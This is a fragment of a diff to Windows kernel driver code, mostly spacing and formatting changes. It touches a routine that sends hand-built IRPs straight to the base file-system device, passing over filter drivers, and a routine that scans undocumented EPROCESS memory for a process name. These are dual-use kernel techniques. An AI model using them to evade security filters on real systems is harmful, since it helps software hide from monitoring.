                               FILE_INFORMATION_CLASS  FileInformationClass, BOOLEAN  ReplaceIfExists)
 {
 
-    
+
     NTSTATUS                ntStatus = STATUS_SUCCESS;
     PDEVICE_OBJECT          DeviceObject;
     PIRP                                 Irp;
     KEVENT                           SycEvent;
     PIO_STACK_LOCATION      irpSp;
-    if (pFileObject == NULL || pIoStatusBlock==NULL || pFileInformation ==NULL|| FileInformationLength <=0)return STATUS_INVALID_PARAMETER;
+    if (pFileObject == NULL || pIoStatusBlock == NULL || pFileInformation == NULL || FileInformationLength <= 0)return STATUS_INVALID_PARAMETER;
 
     //DeviceObject = IoGetRelatedDeviceObject(pFileObject);
-    DeviceObject=IoGetBaseFileSystemDeviceObject(pFileObject);
+    DeviceObject = IoGetBaseFileSystemDeviceObject(pFileObject);
     if (DeviceObject == NULL || DeviceObject->StackSize <= 0)return STATUS_UNSUCCESSFUL;
 
     Irp = IoAllocateIrp(DeviceObject->StackSize, TRUE);
@@ -3119,7 +2992,7 @@ NTSTATUS IrpSetFileAttributes(PFILE_OBJECT pFileObject, PIO_STATUS_BLOCK  pIoSta
     Irp->Tail.Overlay.OriginalFileObject = pFileObject;
     Irp->Tail.Overlay.Thread = (PETHREAD)KeGetCurrentThread();
     Irp->RequestorMode = KernelMode;
-    
+
     irpSp = IoGetNextIrpStackLocation(Irp);
     irpSp->MajorFunction = IRP_MJ_SET_INFORMATION;
     irpSp->DeviceObject = DeviceObject;
@@ -3130,7 +3003,7 @@ NTSTATUS IrpSetFileAttributes(PFILE_OBJECT pFileObject, PIO_STATUS_BLOCK  pIoSta
     irpSp->Parameters.SetFile.FileObject = pFileObject;
 
     IoSetCompletionRoutine(Irp, IoCompletionRoutineEx, NULL, TRUE, TRUE, TRUE);
-    ntStatus=IoCallDriver(DeviceObject, Irp);
+    ntStatus = IoCallDriver(DeviceObject, Irp);
     if (ntStatus == STATUS_PENDING)
         KeWaitForSingleObject(&SycEvent, Executive, KernelMode, TRUE, NULL);
     ntStatus = pIoStatusBlock->Status;
@@ -3205,18 +3078,18 @@ NTSTATUS IrpFileWrite(PFILE_OBJECT pFileObject, PLARGE_INTEGER ByteOffset, ULONG
 ULONG  GetNameOffset(PEPROCESS proobj)
 {
     ULONG offsetName = 0;
-    PVOID ppeb=  PsGetProcessPeb(proobj);
+    PVOID ppeb =  PsGetProcessPeb(proobj);
     if (ppeb) {
 
-        ULONG pianyi=9;
+        ULONG pianyi = 9;
         ULONG i = 0;
         ULONG j = 0;
-        for (i = 0; i < 0x500; i+=4) {
+        for (i = 0; i < 0x500; i += 4) {
             PUCHAR pAddr1 = (PUCHAR)proobj + i;
             if (MmIsAddressValid(pAddr1)) {
                 ULONG_PTR  pPebVal = *(PULONG_PTR)pAddr1;
                 if (pPebVal == ppeb) {
-                    pianyi=i;
+                    pianyi = i;
                     break;
                 }
             }
@@ -3231,10 +3104,10 @@ ULONG  GetNameOffset(PEPROCESS proobj)
                 if (MmIsAddressValid(pNameOffset)) {
                     ULONG_PTR pAddr2 = *pNameOffset;
                     PUNICODE_STRING  pName = (PUNICODE_STRING)pAddr2;
-                    if (MmIsAddressValid(pName)&&MmIsAddressValid(pName->Buffer)) {
+                    if (MmIsAddressValid(pName) && MmIsAddressValid(pName->Buffer)) {
                         WCHAR *pPath = pName->Buffer;
-                        if (wcsstr(pPath,L".exe")!=NULL) {
-                            LOG(LOGFL_INFO, ("[GetNameOffset] offset:%x pPath:%ws", offset,pPath));
+                        if (wcsstr(pPath, L".exe") != NULL) {
+                            LOG(LOGFL_INFO, ("[GetNameOffset] offset:%x pPath:%ws", offset, pPath));
                             offsetName =  offset;
                             break;
                         }
